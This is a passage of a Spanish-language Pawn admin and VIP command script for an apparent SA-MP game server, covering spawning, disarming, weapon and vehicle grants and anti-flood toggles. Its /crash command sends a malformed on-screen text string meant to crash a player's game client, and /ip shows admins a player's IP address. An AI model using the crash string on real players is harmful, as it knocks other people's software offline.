CMD:spawn(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Spawn [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/Spawn");
			format(string, sizeof(string), "|Info| »{EAEAEA} Has reiniciado a {0080FF}%s.", pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha reiniciado.", pName(playerid)); SendClientMessage(player1,red,string); }
			SetPlayerPos(player1, 0.0, 0.0, 0.0);
			return SpawnPlayer(player1);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
}


CMD:disarm(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Disarm [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/Disarm");  PlayerPlaySound(player1,1057,0.0,0.0,0.0);
			format(string, sizeof(string), "|Info| »{EAEAEA} Has desarmado a {0080FF}%s.", pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha desarmado.", pName(playerid)); SendClientMessage(player1,red,string); }
			ResetPlayerWeapons(player1);
			return PlayerPlaySound(player1,1057,0.0,0.0,0.0);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:crash(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Crash [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
   			CMDMessageToAdmins(playerid,"/Crash");
   	        GameTextForPlayer(player1, "³£³²¢£¬²¢²³~wwwwwwwwww",66666000, 6);
			format(string, sizeof(string), "|Info| »{EAEAEA} Has crasheado a {0080FF}%s.", pName(player1));
			return SendClientMessage(playerid,red, string);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:ip(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Ip [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/Ip");
			new tmp3[50]; GetPlayerIp(player1,tmp3,50);
			format(string,sizeof(string),"|Info| »{EAEAEA} La IP de {0080FF}%s{EAEAEA} es {FF0000}%s.", pName(player1), tmp3);
			return SendClientMessage(playerid,red,string);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
}

CMD:bankrupt(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /BankRupt [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/BankRupt");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has reseteado el dinero a {0080FF}%s.", pName(player1)); SendClientMessage(playerid,red,string);
			if(player1 != playerid) { format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha reseteado tu dinero.", pName(playerid)); SendClientMessage(player1,red,string); }
   			return ResetPlayerMoney(player1);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:sbankrupt(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "USA]:{EAEAEA} /SbankRupt [JugadorID]");
		new player1 = strval(params), string[128];
		if(PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel]) return SendClientMessage(playerid,red,"ERROR: You cannot use this command on this admin");
        if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/SbankRupt");
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has reseteado el dinero a {0080FF}%s{EAEAEA} secretamente.", pName(player1)); SendClientMessage(playerid,red,string);
   			return ResetPlayerMoney(player1);
	    } else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}


CMD:time(playerid,params[]) {
	#pragma unused params
	new string[64], hour,minuite,second; gettime(hour,minuite,second);
	format(string, sizeof(string), "~g~|~w~%d:%d~g~|", hour, minuite);
	return GameTextForPlayer(playerid, string, 5000, 1);
}

CMD:ubound(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
		if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Ubound [JugadorID]");
	    new string[128], player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			CMDMessageToAdmins(playerid,"/Ubound");
			SetPlayerWorldBounds(player1, 9999.9, -9999.9, 9999.9, -9999.9 );
			format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha removido tu mundo virtual.", PlayerName2(playerid)); if(player1 != playerid) SendClientMessage(player1,red,string);
			format(string,sizeof(string),"|Info| »{EAEAEA} Le has removido el mundo virtual a {0080FF}%s.", PlayerName2(player1));
			return SendClientMessage(playerid,red,string);
		} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}


CMD:antijoinflood(playerid,params[]){
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
        new string[128];
		if(AntiJoinFlood)
		{
			AntiJoinFlood = 0;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el AntiJoinFlood.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("DisableLog",string);
		}
		else
		{
			AntiJoinFlood = 1;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el AntiJoinFlood.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("EnableLog",string);
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	return 1;
}
CMD:antifakekill(playerid,params[]){
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
        new string[128];
		if(AntiFakeKill)
		{
			AntiFakeKill = 0;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el AntiFakeKill.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("DisableLog",string);
		}
		else
		{
			AntiFakeKill = 1;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el AntiFakeKill.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("EnableLog",string);
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	return 1;
}
CMD:antibots(playerid,params[]){
    if(PlayerInfo[playerid][Level] >= 10 || IsPlayerAdmin(playerid)) {
	    new string[128];
		if(AntiBots)
		{
			AntiBots = 0;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha deshabilitado el AntiBots.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("DisableLog",string);
		}
		else
		{
			AntiBots = 1;
			format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha habilitado el AntiBots.", pName(playerid) );
			MessageToAdmins(red, string);
			SaveToFile("EnableLog",string);
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 10{EAEAEA} para usar este comando.");
	return 1;
}
CMD:admincmds(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		new string[475];
		format(string,sizeof(string),"{FF0000}*{FFFFFF} Nivel 1{00BFFF} (/Level1)\n{FF0000}*{FFFFFF} Nivel 2{00BFFF} (/Level2)\n{FF0000}*{FFFFFF} Nivel 3{00BFFF} (/Level3)\n{FF0000}*{FFFFFF} Nivel 4{00BFFF} (/Level4)\n{FF0000}*{FFFFFF} Nivel 5{00BFFF} (/Level5)\n{FF0000}*{FFFFFF} Nivel 6{00BFFF} (/Level6)",string);
		format(string, sizeof string, "%s\n{FF0000}*{FFFFFF} Nivel 7{00BFFF} (/Level7)\n{FF0000}*{FFFFFF} Nivel 8{00BFFF} (/Level8)\n{FF0000}*{FFFFFF} Nivel 9{00BFFF} (/Level9)\n{FF0000}*{FFFFFF} Nivel 10{00BFFF} (/Level10)",string);
		ShowPlayerDialog(playerid,AdminCmds,DIALOG_STYLE_LIST,"Comandos de admin",string,"Seleccionar","Salir");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}

CMD:vipcmds(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >= 1 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid, VipCmds, DIALOG_STYLE_LIST, "Comandos de vip", "{FF0000}*{FFFFFF} Nivel 1{00FF00} (/VLevel1)\n{FF0000}*{FFFFFF} Nivel 2{00FF00} (/VLevel2)\n{FF0000}*{FFFFFF} Nivel 3{00FF00} (/VLevel3)", "Seleccionar", "Salir");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00FF00}Nivel 1{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vlevel3(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=3 || IsPlayerAdmin(playerid)) {
	ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX, "{0080FF}COMANDOS DE VIP NIVEL 3", "{FFFFFF}+ Comandos de vip nivel 1 y 2.\n\n/Volar, /VolarOff, /Vminigun, /Vlanzacohetes, /Vbazooka.\n/Vlanzallamas, /Vrhino, /Vhydra, /Vseasparrow, /Vhunter.\n/BalasExplosivas, /Autotanque /Ghostrider", "Aceptar", "");
	}
	else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}

CMD:vminigun(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
        if(UsarArmas[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otras armas de guerra.");
     	SetTimerEx("AntiFloodArmas", 180000, false, "i", playerid);
     	UsarArmas[playerid] = 1;
		ArmasProhibidas[playerid]=0;
		GivePlayerWeapon(playerid,38,5000);
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Minigun!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vbazooka(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarArmas[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otras armas de guerra.");
     	SetTimerEx("AntiFloodArmas", 180000, false, "i", playerid);
     	UsarArmas[playerid] = 1;
		ArmasProhibidas[playerid]=0;
		GivePlayerWeapon(playerid,36,1500);
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Bazooka!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vlanzallamas(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarArmas[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otras armas de guerra.");
     	SetTimerEx("AntiFloodArmas", 180000, false, "i", playerid);
     	UsarArmas[playerid] = 1;
		ArmasProhibidas[playerid]=0;
		GivePlayerWeapon(playerid,37,2500);
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Llamas!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vlanzacohetes(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarArmas[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otras armas de guerra.");
     	SetTimerEx("AntiFloodArmas", 180000, false, "i", playerid);
     	UsarArmas[playerid] = 1;
		ArmasProhibidas[playerid]=0;
		GivePlayerWeapon(playerid,35,1500);
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Cohetes!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vhydra(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarVehiculos[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otros vehiculos de guerra.");
     	SetTimerEx("AntiFloodVehiculos", 180000, false, "i", playerid);
     	UsarVehiculos[playerid] = 1;
        new LVehicleIDt;
		LVehicleIDt = CarSpawner(playerid,520);
		VehicleInfo[LVehicleIDt][Temp] = 1;
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Hydra!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vseasparrow(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarVehiculos[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otros vehiculos de guerra.");
     	SetTimerEx("AntiFloodVehiculos", 180000, false, "i", playerid);
     	UsarVehiculos[playerid] = 1;
		new LVehicleIDt;
		LVehicleIDt = CarSpawner(playerid,447);
		VehicleInfo[LVehicleIDt][Temp] = 1;
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}SeaSparrow!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vrhino(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarVehiculos[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otros vehiculos de guerra.");
     	SetTimerEx("AntiFloodVehiculos", 180000, false, "i", playerid);
     	UsarVehiculos[playerid] = 1;
		new LVehicleIDt;
		LVehicleIDt = CarSpawner(playerid,432);
		VehicleInfo[LVehicleIDt][Temp] = 1;
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Rhino!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vhunter(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
	    if(UsarVehiculos[playerid] == 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes esperar 3 minutos para volver a usar otros vehiculos de guerra.");
     	SetTimerEx("AntiFloodVehiculos", 180000, false, "i", playerid);
     	UsarVehiculos[playerid] = 1;
		new LVehicleIDt;
		LVehicleIDt = CarSpawner(playerid,425);
		VehicleInfo[LVehicleIDt][Temp] = 1;
		SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Hunter!");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:volar(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
		StartFly(playerid);
		SetPlayerHealth(playerid, 9999999.0);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Modo de vuelo activado.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}
CMD:volaroff(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
		StopFly(playerid);
		SetPlayerHealth(playerid,99.0);
		GameTextForPlayer(playerid, "~w~Modo de Vuelo~n~~r~Desactivado", 3000, 3);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Modo de vuelo desactivado.");
	} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}

CMD:balasexplosivas(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 3 || IsPlayerAdmin(playerid)) {
		if(BalasExplosivas[playerid] == 0)
		{
			GameTextForPlayer(playerid, "~w~Balas Explosivas ~n~~r~Activado",2500,3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Balas explosivas activado.");
			BalasExplosivas[playerid] = 1;
		}
		else if(BalasExplosivas[playerid] == 1)
		{
			GameTextForPlayer(playerid, "~w~Balas Explosivas ~n~~r~Deactivado",2500,3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Balas explosivas desactivado.");
			BalasExplosivas[playerid] = 0;
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {00BFFF}Nivel 3{EAEAEA} para usar este comando.");
	return 1;
}

CMD:ayudaglobo(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 1)
    {
		new iString[500];
		strcat(iString, "{FF8000}/globo {FFFFFF} Creas el globo\n\n");
		strcat(iString, "{FF8000}/borrarg {FFFFFF} Borras el globo que hiciste - Si no lo usas, borralo.\n\n");
		strcat(iString, "{FF8000}/volarg {FFFFFF} Despegas y comienzas a volar\n\n");
		strcat(iString, "{FF8000}/volver {FFFFFF} Vuelves al punto de despegue");
    	ShowPlayerDialog(playerid, 1111, DIALOG_STYLE_MSGBOX, "{FFFF80}Comandos Globo", iString, "Aceptar", "Cerrar");
    	PlayerPlaySound(playerid,1139,0.0,0.0,0.0);
    }else ShowPlayerDialog(playerid,2014,DIALOG_STYLE_MSGBOX,"     ", "{FF0000}Info: {FFFFFF}Nesesitas ser vip nivel 1 para usar este comando.", "Aceptar", "");
    return 1;
}

CMD:globo(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 1)
    {
		if(GloboCreado == 0)
		{
			GetPlayerPos(playerid, pos_data[0], pos_data[1], pos_data[2]);
			g_1 = CreateDynamicObject(19338, pos_data[0], pos_data[1], pos_data[2]-1, 0, 0, 0, -1, -1, -1);
			SetPlayerPos(playerid, pos_data[0], pos_data[1], pos_data[2]+1);
			GloboCreado = 1;
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Creaste un globo. Para despegar usa /volarg, para eliminarlo usa /borrarg.");
		}
		else return SendClientMessage(playerid,red, "|Info| »{EAEAEA} Solo puedes crear un globo. Usa /borrarg para borrarlo y crear otro.");
	}
	return 1;
}

CMD:volver(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 1)
    {
		if(GloboCreado==1)
		{
    		MoveDynamicObject(g_1, pos_data[0], pos_data[1], pos_data[2], 10, 0, 0, 0);
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Decidiste volver, espera a que el globo llegue al lugar del despegue.");
		}else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No has creado ningun globo.");
	}else SendClientMessage(playerid,red,"|Error| »{EAEAEA} Necesitas ser vip nivel 1 para este comando");
	return 1;
}


CMD:borrarg(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 1)
    {
	if(GloboCreado == 1)
	{
		SendClientMessage(playerid, red, "|Info| » {EAEAEA} Has borrado el globo.");
		GloboCreado = 0;
		DestroyDynamicObject(g_1);
	}
	else return SendClientMessage(playerid, red, "|Error| » {EAEAEA} No has creado ningun globo.");
	}else SendClientMessage(playerid, red,"|Error| »{EAEAEA} Necesitas ser vip nivel 1 para este comando.");
	return 1;
}


CMD:volarg(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 1)
    {
		MoveDynamicObject(g_1, pos_data[0]+random(2000), pos_data[1]+random(2000), pos_data[2]+random(500)*1.5, 10, 0, 0, 0);
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} El globo esta volando, puedes usar /volver para regresar al lugar del despegue.");
	}else SendClientMessage(playerid, red,"|Error| »{EAEAEA} Necesitas ser vip nivel 1 para este comando.");
	return 1;
}



CMD:nloco(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(Glow[playerid] == 0)
		{
			GameTextForPlayer(playerid, "~w~Nombre Loco~n~~r~Activado", 3000, 3);
			SendClientMessage(playerid,red, "|Info| »{EAEAEA} Nombre loco activado.");
			Glow[playerid] = 1;
		}
		else if(Glow[playerid] == 1)
		{
			GameTextForPlayer(playerid, "~w~Nombre Loco~n~~r~Desactivado", 3000, 3);
			SendClientMessage(playerid,red, "|Info| »{EAEAEA} Nombre loco desactivado.");
			Glow[playerid] = 0;
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}
CMD:vloco(playerid,params[]) {
    if(PlayerInfo[playerid][Vip] >= 2 || IsPlayerAdmin(playerid)) {
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el conductor.");
			return 1;
		}
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ¡No estás en un vehículo!");
		if(crazycar[playerid] == 0)
		{
			if(ColorCar[playerid] == 0)
			{
				vremea[playerid] = SetTimerEx("CarColor", 1000, 1,"i",GetPlayerVehicleID(playerid));
				ColorCar[playerid] = 1;
			}
			GameTextForPlayer(playerid, "~w~Vehiculo Loco~n~~r~Activado", 3000, 3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Vehiculo Loco activado.");
			crazycar[playerid] = 1;
		}
		else if(crazycar[playerid] == 1)
		{
			KillTimer(vremea[playerid]);
			ColorCar[playerid] = 0;
			GameTextForPlayer(playerid, "~w~Vehiculo Loco~n~~r~Desactivado", 3000, 3);
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Vehiculo Loco desactivado.");
			crazycar[playerid] = 0;
		}
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser vip {FFFF00}Nivel 2{EAEAEA} para usar este comando.");
	return 1;
}

CMD:autocbug(playerid,params[])
{
    if(PlayerInfo[playerid][Vip] >= 3)
    {
	if(PlayerAutoCBUG[playerid]==1)
	{
        SendClientMessage(playerid,-1,"{FF0000}[INFO]:{FFFFFF} Haz desactivado el auto C-BUG");
	    //enviarmensajesvip(playerid,"AutoCbug(OFF)");
	    PlayerAutoCBUG[playerid] = 0;
	}
	else
	{
	    //enviarmensajesvip(playerid,"AutoCbug(ON)");
	    SendClientMessage(playerid,-1,"{FF0000}[INFO]:{FFFFFF} Haz activado el auto C-BUG");
	    PlayerAutoCBUG[playerid] = 1;
	}
    }
	else return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}NIVEL INSUFICIENTE","{FFFFFF}NECESITAS SER VIP {0080FF}NIVEL 4{FFFFFF} PARA USAR ESTE COMANDO.", "Aceptar", "");
	return 1;
}

CMD:autotanque(playerid,params[])
{
#pragma unused params
if(PlayerInfo[playerid][Vip] >= 3)
{
	if(FireShotON[playerid] == 0)
	{
		FireShotON[playerid] = 1;
		//enviarmensajesvip(playerid,"Autotanque(on)");
		SendClientMessage(playerid, 0x0000BB66, "{FF0000}[INFO]:{FFFFFF} Modo autotanque activado para lanzar misiles usa {A9A9A9}'Click'");
	}
	else if(FireShotON[playerid] == 1)
	{
		FireShotON[playerid] = 0;
		//enviarmensajesvip(playerid,"Autotanque(off)");
		SendClientMessage(playerid, red, "{FF0000}[INFO]:{FFFFFF} Modo autotanque desactivado");
	}
}else ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}NIVEL INSUFICIENTE","{FFFFFF}NECESITAS SER VIP {0080FF}NIVEL 3{FFFFFF} PARA USAR ESTE COMANDO.", "Aceptar", "");
return 1;
}

CMD:ghostrider(playerid,params[]){
    if(PlayerInfo[playerid][Vip] >= 3) {
		new veh=GetPlayerVehicleID(playerid);
  		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, red, "{FF0000}[ERROR]:{FFFFFF} Necesitas estar en una moto Freeway para poder usar este comando.");
  	 	if(GetVehicleModel(veh) != 463)return SendClientMessage(playerid, red, "{FF0000}[ERROR]:{FFFFFF} Necesitas estar en una moto Freeway para poder usar este comando.");
  		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER)return SendClientMessage(playerid, COLOR_RED, "{FF0000}[ERROR]:{FFFFFF} Tienes que ser el conductor de la moto.");
     	if(GhostRiderObjects[playerid][0]){
			GameTextForPlayer(playerid, "~w~Modo Ghost Rider~n~~r~Desactivado", 3000, 3);
			SendClientMessage(playerid, 0xAFAFAFAA, "{FF0000}[INFO]:{FFFFFF} Modo Ghost Rider desactivado.");
			GhostRiderDesactivar(playerid);
			GhostRiderObjects[playerid][0]=0;
			return 1;
		}
	 	else{
			GameTextForPlayer(playerid, "~w~Modo Ghost Rider~n~~r~Activado", 3000, 3);
			SendClientMessage(playerid, 0xAFAFAFAA, "{FF0000}[INFO]:{FFFFFF} Modo Ghost Rider activado, para desactivarlo usa {A9A9A9}/GhostRider.");
			GhostRiderActivar(playerid, veh);
		}
    }else return ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"{FF0000}NIVEL INSUFICIENTE","{FFFFFF}NECESITAS SER VIP {0080FF}NIVEL 3{FFFFFF} PARA USAR ESTE COMANDO.", "Aceptar", "");
	return 1;
}


CMD:vlevel2(playerid,params[]){
	#pragma unused params
	if(PlayerInfo[playerid][Vip] >=2 || IsPlayerAdmin(playerid)) {
